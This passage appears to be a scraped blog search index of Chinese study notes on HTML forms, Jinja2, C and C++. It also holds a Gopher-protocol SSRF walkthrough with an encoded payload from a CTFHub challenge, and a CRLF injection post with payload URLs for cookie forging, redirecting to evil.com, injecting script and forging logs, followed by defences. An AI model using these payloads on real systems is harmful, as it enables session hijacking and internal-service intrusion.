input type=search name=search placeholder=Search... 单选按钮 (input type=radio): 允许用户在一组选项中选择一个。 复选框 (input type=checkbox): 允许用户选择多个选项。 下拉列表下拉列表框是一个可选列表。 如果预选a，则option value=a selecteda/option 提交按钮 (input type=submit): 提交表单数据。 input type=submit value=Submit 重置按钮 (input type=reset): 重置表单输入字段为初始值。 input type=reset value=Reset 隐藏输入 (input type=hidden): 用于隐藏数据，用户不可见。 input type=hidden name=hiddenField value=hiddenValue 文件上传 (input type=file): 允许用户上传文件。 input type=file name=fileUpload 按钮 (input type=button): 创建一个可点击的按钮，但不会提交表单。 input type=button value=Click Me 颜色选择器 (input type=color): 允许用户选择颜色。 input type=color name=favcolor value=#ff0000 日期选择器 (input type=date): 允许用户选择日期。 input type=date name=birthday 时间选择器 (input type=time): 允许用户选择时间。 input type=time name=time 日期和时间选择器 (input type=datetime-local): 允许用户选择日期和时间。 input type=datetime-local name=eventtime 月选择器 (input type=month): 允许用户选择月份和年份。 input type=month name=birthdate 周选择器 (input type=week): 允许用户选择一周。 input type=week name=week 这些输入元素可以包含在 form 元素中，并且可以通过 form 元素的 action 属性指定提交数据的 URL，通过 method 属性指定提交数据的方式（通常是 GET 或 POST）。 form action=/submit-form method=post !-- 输入元素放在这里 -- input type=text name=username placeholder=Enter your username input type=submit value=Submit/form 在这个例子中，当用户填写用户名并点击提交按钮时，表单数据将通过 POST 方法发送到 /submit-form URL。 HTML框架 通过使用框架，可以在同一个浏览器窗口中显示不止一个页面。 iframe语法 iframe src=URL/iframe iframe作用 设置高度与宽度 移除边框 frameborder 属性定义iframe表示是否显示边框。设置属性值为 “0” 移除iframe的边框 显示目标链接页面 iframe 可以显示一个目标链接的页面 HTML 脚本（JavaScript） HTML 速查列表 [][HTML 速查列表 | 菜鸟教程 (runoob.com)]https://www.runoob.com/html/html-quicklist.html 表单 搜索 用户名 密码 邮箱 性别 男 女 订阅推送信息 国家 CN USA UK","tags":["前端","HTML"],"categories":["前端"]},{"title":"Gopher协议","path":"/2025/07/09/Gopher协议/","content":"Gopher协议 概述 Gopher是互联网早期的一种协议 在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口 利用gopher协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp 等，也可以发送 GET、POST 请求，这可以拓宽 SSRF 的攻击面 格式 gopher://host:port/gopher-path_后接TCP数据流 gopher的默认端口是70 如果是post请求，回车换行要用到%0d%0a(post请求有几个必备请求头) 基于post请求，如果有多个参数，也要把进行URL编码(%26) Gopher发送HTTP请求 gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议 GET型 格式 构造HTTP数据包 URL编码、替换回车换行为%0d%0a 发送gopher协议 问号（？）需要转码为URL编码，也就是%3f 回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a 在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束） 示例 源码： ?php echo Hello .$_GET[name]. ? 请求： GET /ssrf/get.php?name=ikunma HTTP/1.1Host: 127.0.0.1 构造请求包： gopher://127.0.0.1/_GET /ssrf/get.php?name=ikunma HTTP/1.1Host: 127.0.0.1 编码（这边是一次，有的要两次） gopher://127.0.0.1:80/_GET%20/ssrf/base/get.php%3fname=ikunma%20HTTP/1.1%0d%0AHost:%20127.0.0.1%0d%0A 注：URL 编码中，%0A 和 %0a 实际上是表示相同的字符，即换行符。它们之间的区别在于大小写。在 URL 编码中，字母的大小写通常是不敏感的，因此 %0A 和 %0a 都会被解释为换行符 POST型 格式： POST /ssrf/post.php HTTP/1.1host:127.0.0.1Content-Type:application/x-www-form-urlencodedContent-Length:11name=ikunma 写包： gopher://127.0.0.1:80/_POST /ssrf/base/post.php HTTP/1.1Host:127.0.0.1Content-Type:application/x-www-form-urlencodedContent-Length:11name=ikunma url编码（实际操作要两次）： gopher://127.0.0.1:80/_POST%20%2Fssrf%2Fbase%2Fpost.php%20HTTP%2F1.1%0D%0AHost%3A127.0.0.1%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AContent-Length%3A11%0D%0A%0D%0Aname%3Dikunma%0D%0A 编码次数 传参经过多少次跳转就需要经过多少次url编码 直接curl后接gopher://就编码一次 利用?url=gopher://就编码两次 还经过302跳转，就编码三次。 例题 CTFHub-SSRF系列-POST请求 先本地访问 ?url=127.0.0.1/flag.php 源码： form action=/flag.php method=postinput type=text name=key!-- Debug: key=a1fd25f0d3ac467c1368019781a49713--/form 再访问一下302.php /302.php 源码： !DOCTYPE HTML PUBLIC -//IETF//DTD HTML 2.0//ENhtmlheadtitle404 Not Found/title/headbodyh1Not Found/h1pThe requested URL /302.php was not found on this server./phraddressApache/2.4.25 (Debian) Server at challenge-c47c6ea85c502c46.sandbox.ctfhub.com Port 10800/address/body/html 这里通过302.php的跳转来实现gopher协议伪造 将 127.0.0.1/302.php?url=gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1Host: 127.0.0.1:80Content-Type: application/x-www-form-urlencodedContent-Length: 36key=a1fd25f0d3ac467c1368019781a49713 url编码3次 127.0.0.1%252F302.php%253Furl%253Dgopher%253A%252F%252F127.0.0.1%253A80%252F_POST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application%25252Fx-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253Da1fd25f0d3ac467c1368019781a49713 接在?url=之后","tags":["Gopher"],"categories":["计算机网络"]},{"title":"Flask中的Jinja2简单用法","path":"/2025/07/09/Flask中的Jinja2简单用法/","content":"Flask中的Jinja2简单用法 在Python中，该漏洞常见于Flask（一个轻量级Web应用框架）模块中，Flask使用Jinja2作为模板引擎 模板 ...：将花括号内的内容作为表达式执行并返回对应结果。 # 会被解析为497*7 %...%：用于声明变量或条件/循环语句 # 使用set声明变量% set name=ikun %# 条件语句% if var is true %ikun%endif%# 循环语句% for i in range(6) %ikun%endfor% ``：注释 详细用法 变量 全局变量 使用set语句 % set name=ikun % 之后就可以在页面文件中使用name这个变量了 局部变量 使用with语句来创建一个内部作用域 % with name=ikun % name % endwith % name变量只能在with标签中使用 控制语句 控制语句都是放在% ... %中，并且有一个语句% endxxx %来进行结束 if语句 % if user.is_admin % pWelcome, administrator!/p% elif user.is_logged_in % pWelcome back, user.name !/p% else % pPlease log in./p% endif % for语句 普通用法 u1% for user in users % li user.username /li% else % lino users found/li% endfor %/u1 遍历字典 % for key,value in my_dict.items() % dt key /dt dd value /dd% endfor % 循环变量loop % for item in items % loop.index # 当前迭代次数（从1开始） # loop.index0 # 当前迭代次数（从0开始） # loop.revindex # 反向迭代次数（从1开始） # loop.revindex0 # 反向迭代次数（从0开始） # loop.first # 是否是第一次迭代（布尔值） # loop.last # 是否是最后一次迭代（布尔值） # loop.length # 序列长度 # loop.previtem # 上一个迭代项 # loop.nextitem # 下一个迭代项 # loop.depth # 当前循环的嵌套深度（从1开始） # loop.depth0 # 当前循环的嵌套深度（从0开始） #% endfor % 运算符 +号运算符：数字相加，字符串相加，列表相加。但是并不推荐使用+运算符来操作字符串，字符串相加应该使用~运算符。 -号运算符：只能对两个数字相减。 /号运算符：对两个数进行相除。 %号运算符：取余运算。 *号运算符：乘号运算符，并且可以对字符进行相乘。 **号运算符：次幂运算符，比如2**3=8。 in操作符：跟python中的in一样使用，比如1 in [1,2,3]返回true。 ~号运算符：拼接多个字符串，比如\"Hello\" ~ \"World\"将返回HelloWorld 宏(非常重要) 宏是 Jinja2 中的一种可重用代码块，类似于其他编程语言中的函数 宏相当于一个搭建好的页面一部分，可以被引入，可以往宏传递参数。可以将一些经常用到的代码片段放到宏中，然后把一些不固定的值抽取出来当成一个变量，在使用宏时传递参数，从而将宏渲染成为页面的一部分 定义和调用宏 # 定义宏 #% macro 宏名称(参数1, 参数2=默认值) % # 宏内容 # 参数1 - 参数2 % endmacro %# 调用宏 # 宏名称(值1, 参数2=值2) 如定义和调用一个input标签宏 % macro inpput(name,value=,type=text,class=) % input type= type name= name value= value class=form-control class % endmacro %form input(username) input(password,type=password) input(email,type=email,class=large)/form 页面文件中导入宏(import) 在开发中，会将一些常用的宏单独放在一个文件中，需要时再从这个文件中导入 py中import解析 1.直接导入整个模块 import math 2.导入模板并设置别名 import numpy as np 3.导入特定函数/类 from math import sqrt,pi 4.导入并设置别名 from datetime import datetime as dt % import forms.html as forms % //导入宏文件dldtUsername/dtdd forms.input(username) /dd //使用宏dtPassword/dtdd forms.input(password, type=password) /dd/dlp forms.textarea(comment) /p 导入模板并不会把当前上下文中的变量添加到被导入的模板中，我们可以在导入的时候使用with context 把上下文传进去： % from forms.html import my_macro with context % 宏文件中引用其他宏(include) include语句可以把一个模板引入到另外一个模板中，类似于把一个模板的代码copy到另外一个模板的指定位置 # greeting.html #phello， username ！/p# profile.html #% set username = ikun %div class=profile % include greeting.html % # 可以访问当前上下文的变量 #/div 模板文件的继承 模板允许构建一个基础骨架模板，然后让子模板继承并覆盖特定部分 基础模板(base.html)： !DOCTYPE htmlhtmlhead % block head % title% block title %默认标题% endblock %/title % endblock %/headbody % block content % !-- 默认内容 -- p这是基础模板的内容/p % endblock %/body/html 子模板(child.html): % extends base.html %% block title %子页面标题% endblock %% block content % super() # 保留父模板内容 # p这是子模板添加的内容/p% endblock % % extends % 指令 必须是模板的第一个标签 指定要继承的父模板路径 子模板中未定义的块将使用父模板的默认内容 % block %` 标签 - 定义可被覆盖的内容区块 - 基本语法：`% block block_name %内容% endblock % 支持嵌套 block super() 函数 在子模板中调用父模板的 block 内容 可以控制父模板内容的插入位置 模板文件中对block内容的调用，可以使用 self.blockName 的方式 title% block title %% endblock %/titleh1 self.title() /h1 # 调用title block的内容 # 过滤器 过滤器是通过（|）符号进行使用的，其相当于是一个函数，把当前的变量传入到过滤器中，然后过滤器根据自己的功能，再返回相应的值，之后再将结果渲染到页面中 分类 过滤器 功能描述 使用示例 输出结果 字符串处理 lower 转换为小写 \"HELLO\" | lower hello upper 转换为大写 \"hello\" | upper HELLO capitalize 首字母大写 \"hello\" | capitalize Hello trim 去除首尾空格 \" hello \" | trim hello replace(old, new) 字符串替换 \"Hi Tom\" | replace(\"Tom\", \"Alice\") Hi Alice truncate(length=255) 截断字符串 \"Long text\" | truncate(4) Long... 列表/字典 first 获取第一个元素 [1,2,3] | first 1 last 获取最后一个元素 [1,2,3] | last 3 length 获取元素数量 \"hello\" | length 5 join(delimiter) 连接列表元素 [\"A\",\"B\"] | join(\"--\") A--B sort 排序列表 [3,1,2] | sort [1,2,3] map(attribute) 提取对象属性 users | map(attribute='name') 用户名列表 数值处理 round(precision) 四舍五入 3.14159 | round(2) 3.14 abs 绝对值 -5 | abs 5 int / float 类型转换 \"3.14\" | float 3.14 日期时间 datetimeformat(format) 格式化日期 now | datetimeformat(\"%Y/%m/%d\") 2023/08/15 date 提取日期部分 now | date 2023-08-15 逻辑处理 default(value) 设置默认值 name | default(\"匿名\") 变量为空时输出匿名 selectattr(condition) 条件筛选列表 users | selectattr(\"is_active\") 活跃用户列表 rejectattr(condition) 反向筛选列表 users | rejectattr(\"is_banned\") 非封禁用户列表 HTML安全 escape / e HTML转义（防XSS） \"\" | escape script safe 标记内容为安全（不转义） \"Hi\" | safe 显示粗体Hi striptags 去除HTML标签 \"text\" | striptags text 测试器 测试器主要用来判断一个值是否满足某种类型，语法是：if...is...： % if variable is escaped%value of variable: escaped % else %variable is not escaped% endif % Jinja2中测试器有： callable(object)：是否可调用。 defined(object)：是否已经被定义了。 escaped(object)：是否已经被转义了。 upper(object)：是否全是大写。 lower(object)：是否全是小写。 string(object)：是否是一个字符串。 sequence(object)：是否是一个序列。 number(object)：是否是一个数字。 odd(object)：是否是奇数。 even(object)：是否是偶数。 转义 在模板渲染字符串的时候，字符串有可能包括一些非常危险的字符比如、等，这些字符会破坏掉原来HTML标签的结构，更严重的可能会发生XSS跨域脚本攻击，因此如果碰到、这些字符的时候，应该转义成HTML能正确表示这些字符的写法 对于一些不信任的字符串，可以通过 content_html|e 或者是 content_html|escape 的方式进行转义。 如果想关闭自动转义，可以通过 content_html|safe 的方式关闭自动转义。 %autoescape true/false%...%endautoescape%可以将一段代码块放在中间，来开启或关闭自动转义： % autoescape false %pautoescaping is disabled herep will_not_be_escaped % endautoescape % 模板页面中引入静态文件 静态文件主要包括有CSS样式文件、JavaScript脚本文件、图片文件、字体文件等静态资源。 在Jinja中加载静态文件只需要通过url_for全局函数就可以实现： link href= url_for(static,filename=about.css) 参考： Jinja2用法总结","tags":["漏洞","SSTI"],"categories":["漏洞"]},{"title":"C语言","path":"/2025/07/09/C语言/","content":"C语言易错难懂知识 一些基础知识 1.进制 二进制：0b开头 八进制：0开头 十六进制：0X开头（09，AF） 2.float 4字节 有效数字6 double 8字节 有效数字15 不同类型数据运算时，除强制类型转换外，结果都为double型 在一个整数末尾加L/l表示长整型 eg. int b=5; ​ float a=2.0; ​ b=b/2*a; //b=5 3.素数中：不必被2（n-1）整除，只需被2✓n即可，j*ji 4.a%b结果由a的正负性决定，只要a为负数，结果为负数 5.常量和常变量 常变量：在定义变量时，加一个const ​ eg.const int a=3; 变量： （1）整型变量 1000 （2）实型变量 12.34e3 （3）字符常量（只能为一个字符,’ \\42 '为一个字符） ​ 1）普通字符：以ASCII码存储 ​ 常见的ASCII：‘A’ =65 ‘a’ =97 0 =48 ​ 2）转义字符：以’ \\ ‘开头，将’ \\ '后的字符转化为另外意思 ​ eg.’ \\x41 ‘表示16进制41的ASCII字符，即’ A ’ ​ 3）字符串常量：“boy” ​ 4）符号常量（不能对其赋新值）：#define PI 3.1416 6.标识符：只由字母，数字，下划线组成；第一个字符必须是字母或下划线 7.unsigned int =无符号整型 输出用%u （充分利用变量的值的范围（数据范围只有正值）） 8.逗号表达式结果取后面的值 eg.i=(a=6,a*5),a+6;//i=30 9.要输出%应该连续使用2个% 10.字符变量 char c= ? ;printf(%d %c,c,c);=63 ? 11.i和i i=3; j=i++(i=4,j=3)//先赋值后自加 j=++i(i=4,j=4)//先自加在赋值 12.输出： 用%f得到6位小数 %-m.nf ： ​ -号为左对齐 ​ m为最小宽度：输出的总宽度（包括小数点、小数部分和整数部分）如果实际数据长度小于 m，将用空格填充；如果数据长度超过 m，则按实际长度输出，不截断 ​ n为小数小数位数：如果实际小数位数超过 n，会进行四舍五入；如果不足n，会用0补足 %e指定以指数形式输出实数，自动给出数字部分小数位数为6位，指数部分占5列 eg.1.234560 e+002 13.运算符优先级 14.字符（一个）输入输出： getchar putchar© 15.在判断一个量是否为真时，0为假，非0为真 ab//a和b都非0（只有a为真时，才需要判别b的值） a||b//a和b至少一个非0（只有a为假时才需要判别b的值） 16.判断非闰年： !((year%4==0year%100!=0)||year%400==0) 17.两个数乘积=两个数最大公约数 x 最小公倍数 选择结构 ？：表达式（代替复杂的if） max=(ab)?a:b;//ab为真的话，max=a，否则为b switch switch(表达式){ ​\tcase 常量1:语句1; ​\t… ​\tdefault:…; } 循环结构 while语句 只要循环条件表达式为真时，就执行 eg.while(i–)//每次循环开始先检查i当前值是否为真，若为真，循环继续，每次循环结束时i值减少一 do while语句 先无条件执行，再判断循环条件是否成立 for语句 for(…;…[只要值为真，就执行循环];…) break和continue break：提前终止循环 continue：提前结束本次循环，接着执行下次循环 数组 a[3][4] =3行4列 字符数组 字符串结束标志 一个字符串以字符'\\0'作为结束标志（c语言在字符数组储存字符串常量市会自动加一个’\\0’作结束符） 字符数组的输入输出 %s =整个字符串 %c =一个字符 输出时遇到’\\0’就停止输出 scanf输入项如果是字符数组名，不加 scanf读取字符串时，会在遇空白字符时停止读取 单行字符串 while((ch=getchar())!= ) a[i]=ch; i++; char string[100];char c;gets(string);for(int i=0;(c=string[i])!=\\0;i++)···\\\\遍历字符串中每个字符 n行字符串 scanf(%d,n);getchar();char a[100];for(int i=0;in;i++) gets(a); ··· scanf(%d,n);getchar();char string[n][100];for(int i=0;in;i++) gets(string[i]); for(int j=0;string[i][j]!=\\0;j++)··· 字符串处理函数 记得加#includestring.h puts 输出的字符串中可以包含转义字符 e.g char str[]=abc def;puts(str); =abc def gets 从终端输入一个字符串到字符数组，并且得到一个函数值，该函数值是字符数组的起始地址 注：gets和puts函数只能输入/输出一个字符串 strcat 把两个字符数组中字符串连接起来 strcat(str1,str2); strcpy和strncpy 字符串复制函数 strcpy 将字符串2复制到字符数组1中 注：赋值语句只能将一个字符赋给一个字符型变量/字符数组元素 strncpy 将字符串2中前n个字符复制到字符数组1中 strncpy(str1,str2,2);//将str2前2个取代str1原有的2个 strcmp 字符串比较：2个字符串从左到右逐个比较（ASCII值），直到出现不同字符或遇到’\\0’为止 字符串1=字符串2 函数值为0 字符串1字符串2 函数值为正整数 字符串1字符串2 函数值为负整数 strlen 测字符串长度 strlwr 转换为小写 strupr 转换为大写 ctype.h头文件 isalpha判断一个字符是否是字母 isdigit判断一个字符是否是数字 islower判断一个字符是否是小写字母 isupper判断一个字符是否是大写字母 isspace判断一个字符是否是空白字符 tolower将字符大写变小写 toupper将字符小写变大写 函数 函数的定义与声明 在定义函数时要指定函数的类型 函数类型决定返回值类型 用函数原型（函数首部）作函数声明 e.g int add(int a,int b); 函数的嵌套 int max4(int a,int b,int c,int d) int max2(int a,int b); return max2(max2(max2(a,b),c),d);int max2(int a,int b) return(a=b?a:b); 局部与全局变量 注：全局变量开头一般用大写字母，来区别局部变量 static 静态局部/全局变量 函数中局部变量的值在函数调用结束后不消失而继续保留本次调用结束后的值 e.g static int f=1; extern 外部变量声明 在一个文件内扩展外部变量的作用域 将外部变量的作用域扩展到其他文件 e.g extern A,B,C; \\ \\可省略int等类型 指针 指针变量 指针是一个地址，而指针变量是存放地址的变量 指针变量中只能存放地址（指针），不要将一个整数给指针变量 p=a; *p=1;\\ \\将1赋值给p所指向的变量即把1赋给a 定义：类型名 * 指针变量名 ​\tint* point; ​\tpoint=a;\\ \\等价于int* point=a; 函数调用时不加* e.g swap(point_1,point_2); 为使在函数中改变的变量能被main所用，应该用指针变量做函数参数 e.g void swap(int *p1,int *p2) int temp; temp=*p1; *p1=*p2; *p2=temp; 通过指针引用数组 一维数组 int *p;p=a[0];\\\\不能写成*p=a[0]; p=a[0];p=a;\\\\p的值是数组a的首元素 如果指针元素p指向数组中的一个元素，则p+1指向同一数组的下个元素，p-1指向同一数组的上个元素 如果p的初值为a[0]，则p+i/a+i即a[i]的地址，*(p+i)/ *(a+i)是p+i/a+i所指向的数组元素即a[i] 两个地址不能相加 若指针变量p1、p2都指向同一数组中的元素，p2-p1结果为(p2-p1)的值（地址之差） int i,a[10];int* p=a;\\\\p初值是a，p指向a[0]for(i=0;i10;i++)scanf(%d,p++);p=a;\\\\重新使p指向a[0]for(i=0;i10;i++,p++)printf(%d,*p); 若a[0]=3，++(*p) =a[0]=4 fun(int arr[],int n) = fun(int* arr,int n) 二维数组 *(a[i]+j)或 *(*(a+i)+j)是a[i][j]的值 对于a是二维数组，则a[i]是一位数组名，他是一个地址，并不代表一个储存单元/其中的值 int (*p)[4]定义包含4个元素的一维数组的指针变量 e.g 有一个二维数组int arr[3][4]，可用int (*p)[4]来声明一个指针p指向这个二维数组某一行 int arr[3][4]=0,1,2,3,4,5,6,7,8,9,10,11;int (*p)[4]=arr[0];\\\\p指向arr某一行 通过指针引用字符串 通过字符数组名/字符指针变量可以输出一个字符串 char* a,str[10];a=str;scanf(%s,a); 数组名虽代表地址，但它是常量，其值不可改变 字符指针变量指向的字符串常量中的内容是不可被取代 指向函数的指针 函数名是一个指针（地址） int (*p)(int,int)p=max;\\\\将函数入口地址赋给pc=(*p)(a,b);\\\\用*p代替函数名 char* p[6]包含6个指针的数值 用户自己建立数据类型 结构体 struct 结构体名{ ​\t成员表列（类型名 成员名）; }; 引用结构体变量中成员的值：结构体变量名.成员名 e.gstudent1.num=10010; 不能通过输出结构体变量名来达到输出结构体变量所有成员的值 若p指向一个结构体变量stu 则 stu.num = (*p).num = p-num 结构体数组读入不用加 共用体 union 共用体名{ ​\t成员表列（类型名 成员名）; }; typedef声明新类型名 C语言经典例题 统计一个字符串中每个单词的字符数 #includestdio.hint main() char c; int count=0;\\\\用于统计当前单词的字符数 int first=1;\\\\用于标记是否是第一个输出的字符数，初始值为1，表示是第一个 while(scanf(%c,c)c!=.) if(c== )\\\\如果读取到的字符是空格，说明当前单词结束 if(count0)\\\\如果count大于0，说明前面有单词字符被统计 if(!first)printf( );\\\\如果first为0（即不是第一个输出），则先输出一个空格作为分隔 printf(%d,count); first=0; count=0;\\\\重置count为0，准备统计下一个单词 else count++;\\\\如果读取到的字符不是空格，则count加1，继续统计当前单词的字符数 if(count0)\\\\循环结束后，如果count大于0，说明最后一个单词的字符数还没有输出 if(!first)printf( );\\\\如果不是第一个输出，先输出一个空格 printf(%d,count);\\\\输出最后一个单词的字符数 统计3个字符串，并找出其中最大值 #includestdio.h#includestring.hint main() char str [3] [20]; char string[20]; for(int i=0;i3;i++) gets(str[i]); for(int i=0;i2;i++) if(strcmp(str[i],str[i+1])0)strcpy(string,str[i]); if(strcmp(str[i],str[i+1])=0)strcpy(string,str[i+1]); printf(%s,string); 字符串的复制（指针） void copy_string(char* from,char* to) while((*to=*from)!=\\0) to++; from++; void copy_string(char* from,char* to) while((*to++=*from++)!=\\0); void copy_string(char* from,char* to) while(*from!=\\0) *to++=*from++; *to=\\0; 选择排序 void selectSort(int arr[],int n) int i,j,minIndex,temp; for(i=0;in-1;i++) //外层循环控制排序趟数 minIndex=i; //假设当前位置元素就是最小值 for (j=i+1;jn;j++) //内层循环在剩余元素中找最小值 if(arr[j]arr[minIndex])minIndex=j; //更新最小值索引 if(minIndex!=i) //如果找到更小的元素，进行交换 temp=arr[i]; arr[i]=arr[minIndex]; arr[minIndex]=temp; 人数过半 输入N个数，求出现次数超过总数一半的数。数据保证存在这个数。 输入格式: 第一行输入一个正整数N(N1000)； 第二行输入N个数，每个数的绝对值不超过1e9。 输出格式: 输出一个数，即出现次数超过总数一半的数。 #includestdio.hint main() int n; scanf(%d,n); int a[2000]; for(int i=0;in;i++) scanf(%d,a[i]); int can=a[0]; int cnt=1; for(int i=0;in;i++) if(cnt==0) can=a[i]; cnt=1; else if(can==a[i])cnt++; else cnt--; printf(%d,can); n个数字中选出数字和最大的连续一段 int sum1=0,sum=-1000; for(int i=0;in;i++) sum1=(sum1+a[i])a[i]?(sum1+a[i]):a[i]; if(sum1sum)sum=sum1; printf(%d,sum); 结尾不输出空行 int flag=1;···if(!flag)printf( );flag=0;···\\\\输出··· 数组元素右移 n个数，第i个数向右移m个整数变为a[(i+n-m)%n] 单词翻转 #includestdio.h#includestring.hchar* r(char* s) int len=strlen(s); for(int i=0;ilen/2;i++) char t=s[i]; s[i]=s[len-1-i]; s[len-1-i]=t; return s;int main() char s[25]; while(scanf(%s,s)!=EOF) \\\\去除多余空格 printf(%s,r(s)); 10进制数n转化成m进制 int cnt=1,sum=0;while(n0) t=n%m; t*=cnt; sum+=t; n/=m; cnt*=10; 求n的素数因子和 for(int i=1;isqrt(n);i++) if(n%i==0) sum+=i; if(n/i!=i) sum+=n/i; 求a，b的最大公约数 m=a;n=b;while(n!=0) t=m%n; m=n; n=t;\\\\m即为最大公约数 将一个n位数反转 int number,res=0,rem;scanf(%d,number);while(number!=0) rem=num%10; res=res*10+rem; number/=10; 杨辉三角 #includestdio.hint main() int rows,conf=1; scanf(%d,rows); for(int i=0;irows;i++) for(int space=1;space=rows-i-1;space++) printf( ); for(int j=0;j=i;j++) if(j==0||i==0)conf=1; else conf=conf*(i-j+1)/j; printf(%4d ,conf); printf( );","tags":["编程"],"categories":["编程"]},{"title":"CRLF漏洞","path":"/2025/07/09/CRLF漏洞/","content":"CRLF漏洞 CRLF（Carriage Return + Line Feed，回车 + 换行），是 \\r 的组合，表示文本换行 \\r 进行URL编码变成%0D%0A CRLF注入 在输入中插入 \\r ，改变 HTTP 头部或 HTML 页面结构，进而实现 XSS、HTTP 响应拆分（HTTP Response Splitting）、Web 伪造攻击 HTTP响应拆分 原理 服务器在响应 HTTP 头时，通常会使用 \\r 作为分隔符 如果攻击者可以在 URL 或请求头中注入 \\r ，就可能 伪造 HTTP 头部或插入恶意内容 示例 HTTP/1.1 200 OKContent-Type: text/htmlSet-Cookie: user=adminhtmlbodyWelcome/body/html 攻击者构造请求： https://example.com/page?param=%0D%0ASet-Cookie:%20admin=true 服务器返回： HTTP/1.1 200 OKContent-Type: text/htmlSet-Cookie: user=adminSet-Cookie: admin=true -- 攻击者成功伪造 CookiehtmlbodyWelcome/body/html 攻击者成功伪造cookie，可能绕过身份验证，可以用于会话劫持、钓鱼攻击等 其可与location头结合进行重定向 https://example.com/page?username=%0D%0ALocation:%20https://evil.com%0D%0A 可能导致服务器返回： HTTP/1.1 200 OKContent-Type: text/htmlSet-Cookie: user=Location: https://evil.com -- 伪造重定向htmlbodyWelcome!/body/html 用户被恶意跳转到evil.com CRLF与XSS结合 攻击者构造请求： https://example.com/page?param=%0D%0AContent-Length:%200%0D%0A%0D%0Ascriptalert(XSS)/script 服务器返回： HTTP/1.1 200 OKContent-Type: text/htmlContent-Length: 0 -- 伪造的 Content-Length scriptalert(XSS)/script -- XSS 代码被执行 CRLF 造成日志伪造 很多 Web 服务器会将请求参数写入日志，例如： [INFO] 2025-02-07 12:00:00 - User input: test 如果攻击者输入 \\r ，可能伪造日志内容： https://example.com/page?param=%0D%0A%5BWARNING%5D%20Security%20Breach! 服务器日志可能变成： [INFO] 2025-02-07 12:00:00 - User input: [WARNING] Security Breach! 攻击者可以伪造系统日志，可能隐藏攻击痕迹、制造假警报等 防御 CRLF 注入 过滤用户输入，移除 \\r userInput = userInput.replace(/[\\r ]/g, ); // 删除 CRLF 对 URL 参数进行编码 encodeURIComponent(userInput); 设置 HTTP 头安全策略 启用 CSP ，只允许同源（self）资源加载（内嵌 HTML（非 JS 或 CSS）），阻止外部资源加载 Content-Security-Policy: default-src self HTTP 头中使用安全 API 在 setHeader() 时避免拼接用户输入： res.setHeader(Set-Cookie, `user=$encodeURIComponent(username)`); 确保日志安全 使用 JSON.stringify() 记录日志，防止换行 避免直接写入用户输入","tags":["CRLF","漏洞"],"categories":["漏洞"]},{"title":"C++中的转换构造函数与类型转换运算符","path":"/2025/07/09/C++中的转换构造函数与类型转换运算符/","content":"C++中的转换构造函数与类型转换运算符 隐式类型转换 C++的内置类型之间会进行隐式的类型转换 char、short、int、long四个类型混合运算时，较小的(占用字节数小)整数类型会被自动提升为较大的(占用字节数大)整数类型，以确保不会丢失精度 signed类型和unsigned类型混合运算的结果是unsigned类型 整型(char、short、int、long)和浮点类型(float、double)混合运算时，会自动提升为浮点类型；较短的浮点数类型（如float）会被自动提升为更长的浮点数类型（如double）以进行混合运算，以确保不会丢失精度 自定义的类类型转换 C++提供转换构造函数、类型转换运算符函数这两种成员函数来支持类类型的类型转换 转换构造函数 将其他类型的对象转换为本类对象 特点 属于构造函数的一种，没有返回值，函数名和类名一样 只有一个形参，或其他形参都有默认值 形参类型可以是内置类型，也可以是其他类类型 可以使用关键字 explicit 限制隐式转换 使用 class MyClass public: MyClass(int x) // 将 int 转换为 MyClass ; 类型转换运算符函数 将类对象转换为其他类型对象 特点 函数原型没有返回值、没有参数 函数名为关键字operator 类型（类型为要转换的类型） 必须要有return语句，return的类型就是要转换为的类型 转换为的类型可以是内置类型，也可以是其他类类型 使用 class MyClass int value;public: MyClass(int v) : value(v) // 类型转换函数 operator int() const return value; ;","tags":["编程"],"categories":["编程"]},{"title":"C++中的拷贝构造函数、浅拷贝与深拷贝","path":"/2025/07/09/C++中的拷贝构造函数、浅拷贝与深拷贝/","content":"C++中的拷贝构造函数、浅拷贝与深拷贝 拷贝/复制构造函数 C++中两种初始化的区别 1.对于基本类型没有区别 拷贝初始化 int a=5; 直接初始化 int a(5) 2.对于类类型 直接初始化直接调用实参匹配的构造函数 例如: A x(2);//直接初始化，调用构造函数 拷贝初始化总是调用拷贝构造函数 A y=x;//拷贝初始化，调用拷贝构造函数， 基本概念 拷贝构造函数（Copy Constructor）是构造函数的一种，用于 创建新对象时，用已有对象来初始化它，如果没有定义复制构造函数，那么编译器生成默认复制构造函数。默认的复制构造函数完成复制功能 ClassName(const ClassName other); 加const好处 防止误操作将原对象内容修改 防止传入const对象造成【权限放大】 使用条件 使用同类型的对象去初始化另一个对象时 CDate date_1(2025,04,06);CDate date_2 = date_1; // 调用date_2的拷贝构造函数 将一个对象作为实参传递给一个非引用类型的形参 void printDate(CDate date) date.show();...printDate(date_2); // 实参传值到形参，调用拷贝构造函数 从一个返冋类型为非引用类型的函数返回一个对象 CDate g_date(2025,04,06);CDate getDate() return g_date;\t// 返回对象时，调用拷贝构造函数 实例： // g++ 11_Copy_Constructor_Date.cpp#include iostream#include stdio.husing namespace std;class CDatepublic: CDate(int year, int mon, int day);\t// 构造函数声明 CDate(const CDate date); // 拷贝构造函数声明 ~CDate(); // 析构函数声明 void show() //cout Date: m_year . m_mon . m_day endl; cout Date: str endl; private: int m_year; int m_mon; int m_day; char *str;;// 构造函数定义CDate::CDate(int year, int mon, int day) m_year = year; m_mon = mon; m_day = day; str = new char[64]; sprintf(str, %4d.%02d.%02d, year,mon,day); cout Calling Constructor , this= this endl;// 拷贝构造函数定义CDate::CDate(const CDate date) m_year = date.m_year; m_mon = date.m_mon; m_day = date.m_day; str = new char[64]; sprintf(str, %4d.%02d.%02d, m_year,m_mon,m_day); cout Calling Copy Constructor , this= this endl;// 析构函数定义CDate::~CDate() cout Calling Destructor , this= this endl; delete [] str;void printDate(CDate date) date.show();CDate g_date(2025,04,06);;CDate 